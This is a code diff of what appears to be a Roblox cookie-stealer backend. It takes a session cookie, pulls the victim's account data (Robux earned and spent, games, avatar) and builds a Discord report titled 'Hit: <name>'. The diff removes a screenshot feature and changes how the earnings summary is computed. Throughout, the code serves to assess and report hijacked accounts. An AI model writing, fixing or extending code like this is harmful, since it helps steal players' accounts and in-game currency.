@@ -193,7 +193,6 @@ interface RobloxInfo {
   gamepassEarnings: number | null;
   robuxSpent: number | null;
   summary: number | null;
-  screenshotUrl: string | null;
   playedGames: Array<{ name: string; played: boolean }>;
 }
 
@@ -230,9 +229,6 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       ? Math.floor((Date.now() - new Date(createdAt).getTime()) / (1000 * 60 * 60 * 24))
       : null;
 
-    // Free screenshot service — no API key needed
-    const screenshotUrl = `https://image.thum.io/get/width/800/crop/1000/noanimate/https://www.roblox.com/users/${auth.id}/profile`;
-
     return {
       id: auth.id,
       name: auth.name,
@@ -256,7 +252,6 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       gamepassEarnings: null,
       robuxSpent: transactionTotals.spent,
       summary: transactionTotals.summary,
-      screenshotUrl,
       playedGames,
     };
   } catch (e) {
@@ -436,7 +431,7 @@ async function fetchTotalsForTimeframe(
 }
 
 function parseTotals(j: Record<string, number>): { spent: number; summary: number } {
-  // INCOMING (Robux received)
+  // INCOMING (Robux earned) — this is what users want to see as "summary"
   const incoming =
     (j.salesTotal ?? 0) +
     (j.affiliateSalesTotal ?? 0) +
@@ -456,7 +451,8 @@ function parseTotals(j: Record<string, number>): { spent: number; summary: numbe
     (j.groupPayoutsTotal ?? 0) +
     (j.currencyPurchasesTotal ?? 0);
 
-  return { spent: Math.abs(spent), summary: incoming - Math.abs(spent) };
+  // "summary" = gross Robux earned (positive), not net. Net was confusing.
+  return { spent: Math.abs(spent), summary: Math.max(0, incoming) };
 }
 
 async function fetchTransactionTotals(
@@ -663,7 +659,6 @@ function buildDiscordPayload(opts: {
         title: roblox ? `Hit: ${roblox.name}` : "Submission Details",
         color: 0xa855f7,
         thumbnail: roblox?.avatar ? { url: roblox.avatar } : (roblox?.headshot ? { url: roblox.headshot } : undefined),
-        image: roblox?.screenshotUrl ? { url: roblox.screenshotUrl } : undefined,
         fields: mainFields,
         footer: { text: `${siteName} Submission System` },
         timestamp: new Date().toISOString(),
